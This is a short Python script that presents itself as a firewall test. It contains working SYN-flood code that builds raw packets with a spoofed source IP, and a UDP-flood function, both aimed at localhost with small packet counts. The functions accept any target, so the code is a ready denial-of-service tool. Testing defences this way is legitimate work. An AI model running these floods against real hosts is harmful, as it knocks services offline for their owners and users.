#!/usr/bin/env python3
"""
Test script to simulate DDoS attacks using socket
"""

import socket
import time
import threading
import random

def syn_flood(target_ip, target_port, num_packets=100):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        for i in range(num_packets):
            # Create IP header
            ip_header = b'\x45\x00\x00\x3c'  # Version, IHL, TOS, Total Length
            ip_header += b'\xab\xcd\x00\x00'  # ID, Flags, Fragment Offset
            ip_header += b'\x40\x06\x00\x00'  # TTL, Protocol, Checksum
            ip_header += socket.inet_aton("192.168.1.100")  # Source IP
            ip_header += socket.inet_aton(target_ip)  # Destination IP

            # Create TCP header
            sport = 12345 + i
            tcp_header = sport.to_bytes(2, 'big')  # Source Port
            tcp_header += target_port.to_bytes(2, 'big')  # Destination Port
            tcp_header += b'\x00\x00\x00\x00'  # Sequence Number
            tcp_header += b'\x00\x00\x00\x00'  # Acknowledgment Number
            tcp_header += b'\x50\x02\x00\x00'  # Data Offset, Flags (SYN), Window
            tcp_header += b'\x00\x00\x00\x00'  # Checksum, Urgent Pointer

            packet = ip_header + tcp_header
            sock.sendto(packet, (target_ip, 0))
            time.sleep(0.01)
        sock.close()
    except PermissionError:
        print("Permission denied. Run as administrator for raw sockets.")
    except Exception as e:
        print(f"SYN flood error: {e}")

def udp_flood(target_ip, target_port, num_packets=100):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        for i in range(num_packets):
            data = b'A' * 1024  # 1KB payload
            sock.sendto(data, (target_ip, target_port))
            time.sleep(0.01)
        sock.close()
    except Exception as e:
        print(f"UDP flood error: {e}")

if __name__ == "__main__":
    target_ip = "127.0.0.1"  # Localhost
    target_port = 80

    print("Starting SYN flood test...")
    threading.Thread(target=syn_flood, args=(target_ip, target_port, 50)).start()

    print("Starting UDP flood test...")
    threading.Thread(target=udp_flood, args=(target_ip, target_port, 50)).start()

    print("Flood tests initiated. Check firewall logs for blocking.")
